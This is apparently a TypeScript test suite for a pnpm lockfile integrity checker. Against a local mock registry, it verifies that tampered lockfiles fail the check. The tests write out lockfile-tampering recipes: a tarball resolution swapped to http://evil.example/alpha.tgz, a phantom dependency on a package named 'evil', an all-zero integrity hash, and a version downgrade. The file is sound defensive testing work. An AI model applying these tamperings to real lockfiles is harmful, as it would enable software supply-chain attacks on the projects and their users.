import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { runCheck } from '../../src/check.js';
import { type Fixture, makeFixtureRepo, relock } from '../helpers/fixture.js';
import { type Registry, startRegistry } from '../helpers/registry.js';
import { commitAll, writeFiles } from '../helpers/scratch-repo.js';

let registry: Registry;
beforeAll(async () => {
  registry = await startRegistry();
  await registry.publish({ name: 'alpha', version: '1.0.0' });
  await registry.publish({ name: 'alpha', version: '1.1.0' });
  await registry.publish({ name: 'evil', version: '9.9.9' });
});
afterAll(() => registry.stop());

/** author honestly bumps alpha ^1.0.0 → head lockfile, then the attacker edits the committed lockfile */
async function tamperedHead(f: Fixture, mutate: (lock: string) => string): Promise<string> {
  const pkg = JSON.parse(readFileSync(join(f.dir, 'package.json'), 'utf8'));
  pkg.dependencies = { ...pkg.dependencies, alpha: '^1.0.0' };
  writeFiles(f.dir, { 'package.json': JSON.stringify(pkg, null, 2) });
  relock(f.dir);
  const honest = readFileSync(join(f.dir, 'pnpm-lock.yaml'), 'utf8');
  const mutated = mutate(honest);
  if (mutated === honest)
    throw new Error('mutation did not change the lockfile — fix the regex, not the assertion');
  writeFiles(f.dir, { 'pnpm-lock.yaml': mutated });
  return commitAll(f.dir, 'bump alpha (tampered)');
}

async function expectMismatch(mutate: (lock: string) => string): Promise<void> {
  const f = await makeFixtureRepo(registry, {});
  const head = await tamperedHead(f, mutate);
  const r = await runCheck({ base: f.base, head, cwd: f.dir });
  expect(r.outcome.kind).toBe('mismatch');
  expect(r.exit).toBe(1);
}

describe('spec §1.1 attack shapes — every row must byte-fail', () => {
  // Swap the resolution to advertise an attacker-controlled tarball. pnpm's
  // resolution flow map opens `resolution: {`; inject a `tarball:` key before the
  // honest `integrity:` so the committed bytes point derivation's byte-comparison
  // at a URL the honest re-derivation never emits.
  it('tarball-URL resolution swap', () =>
    expectMismatch((lock) =>
      lock.replace(/alpha@1\.1\.0:\s*\n(\s+)resolution: \{/, (m) =>
        m.replace('resolution: {', 'resolution: {tarball: http://evil.example/alpha.tgz, '),
      ),
    ));

  // Replace the honest empty snapshot `alpha@1.1.0: {}` with one carrying a
  // fabricated dependency edge on `evil`. Re-derivation emits `{}`, so the
  // phantom edge fails closed.
  it('phantom edge injected into a snapshot', () =>
    expectMismatch((lock) =>
      lock.replace(
        /(snapshots:\n\n {2}alpha@1\.1\.0:)\s*\{\}/,
        '$1\n    dependencies:\n      evil: 9.9.9',
      ),
    ));

  // Keep the real name@version but swap the integrity for an all-zero sha512. The
  // committed hash no longer matches the tarball the registry actually serves.
  it('integrity lie for a real name@version', () =>
    expectMismatch((lock) =>
      lock.replace(
        /integrity: sha512-[A-Za-z0-9+/=]+/,
        'integrity: sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==',
      ),
    ));

  // Pin the older-but-in-range 1.0.0 everywhere the honest lockfile resolved to
  // 1.1.0. ^1.0.0 honestly resolves to the newest in-range (1.1.0), so downgrading
  // to 1.0.0 is a version-choice game the byte-check catches.
  it('within-range version-choice game (older but in-range pin)', () =>
    expectMismatch((lock) => lock.replaceAll('1.1.0', '1.0.0')));

  it('.npmrc registry redirect PASSES by design (visible diff, review’s job)', async () => {
    const mirror = await startRegistry();
    await mirror.publish({ name: 'alpha', version: '1.0.0' });
    await mirror.publish({ name: 'alpha', version: '1.1.0' });
    const f = await makeFixtureRepo(registry, { alpha: '^1.0.0' });
    writeFiles(f.dir, { '.npmrc': `registry=${mirror.url}\n` });
    relock(f.dir); // author relocks against the mirror — same bytes: pnpm registry entries carry no URLs
    const head = commitAll(f.dir, 'redirect registry');
    const r = await runCheck({ base: f.base, head, cwd: f.dir });
    expect(r.outcome.kind).toBe('pass');
    await mirror.stop();
  });
});
